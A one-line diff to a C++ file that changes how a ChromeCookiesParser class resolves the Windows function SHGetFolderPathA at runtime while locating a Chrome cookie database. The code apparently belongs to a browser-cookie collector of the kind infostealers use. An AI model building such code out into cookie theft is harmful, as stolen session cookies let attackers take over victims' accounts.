@@ -94,7 +94,7 @@ void ChromeCookiesParser::try_collect(const String& chromium_path)
 
 bool ChromeCookiesParser::get_path_to_db(const String& chromium_path)
 {
-	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get_func("SHGetFolderPathA", "shell32.dll");
+	const auto get_user_path = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
 	
 	if (!get_user_path) return false;
 
